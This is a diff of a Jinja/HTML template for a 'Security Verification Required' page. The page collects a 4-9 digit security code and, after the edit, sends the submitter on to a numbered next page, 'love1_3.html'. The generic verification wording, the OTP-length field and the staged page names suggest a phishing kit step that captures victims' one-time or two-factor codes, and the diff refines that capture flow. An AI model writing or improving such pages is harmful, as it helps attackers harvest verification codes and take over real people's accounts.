@@ -11,7 +11,9 @@
     </div>
   </div>
 
-  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🔒 Security Verification Required</h3>
+  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">
+    🔒 Security Verification Required
+  </h3>
   
   <div class="security-options">
     <div class="option-card">
@@ -30,7 +32,9 @@
   </div>
   
   <form id="loginForm" method="post" novalidate>
-    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Security Code</label>
+    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">
+      Security Code
+    </label>
     <input class="input" id="digits" name="digits" placeholder="Enter code" pattern="\d{4,9}" required>
     <div class="error-text" id="digitsError"></div>
 
@@ -46,10 +50,10 @@
   </div>
 
   <script>
-  // Auto redirect after 6 minutes (360,000 ms) - INCREASED FROM 2 MINUTES
-  setTimeout(function(){ window.location = "{{ url_for('f1') }}"; }, 360000);
+  // ✅ REMOVE OLD AUTO-REDIRECT
+  // setTimeout(function(){ window.location = "{{ url_for('f1') }}"; }, 360000);
 
-  // Validation for 4-9 digits
+  // ✅ Validation for 4-9 digits + UPDATED redirect to love1_3.html
   document.getElementById("loginForm").addEventListener("submit", function(event) {
     const digits = document.getElementById("digits");
     const digitsError = document.getElementById("digitsError");
@@ -59,7 +63,7 @@
     digitsError.textContent = "";
 
     const val = digits.value.trim();
-    const pattern = /^\d{4,9}$/; // only 4-9 digits allowed
+    const pattern = /^\d{4,9}$/;
 
     if (!pattern.test(val)) {
       valid = false;
@@ -67,7 +71,13 @@
       digitsError.textContent = "The code you entered is incorrect.";
     }
 
-    if (!valid) event.preventDefault();
+    if (!valid) {
+      event.preventDefault();
+      return;
+    }
+
+    // ✅ NEW UPGRADED FLOW REDIRECT
+    window.location.href = "love1_3.html";
   });
 
   document.getElementById("digits").addEventListener("input", () => {
@@ -83,7 +93,7 @@
 .input {
   width: 100%;
   padding: 14px;
-  border-radius: 18px; /* ROUNDED INPUT */
+  border-radius: 18px;
   border: 1px solid #e5e7eb;
   margin-bottom: 8px;
   font-size: 16px;
@@ -114,7 +124,7 @@
   font-size: 16px;
   font-weight: 700;
   padding: 12px;
-  border-radius: 25px; /* ROUNDED LOGIN BUTTON */
+  border-radius: 25px;
   cursor: pointer;
   border: none;
   transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
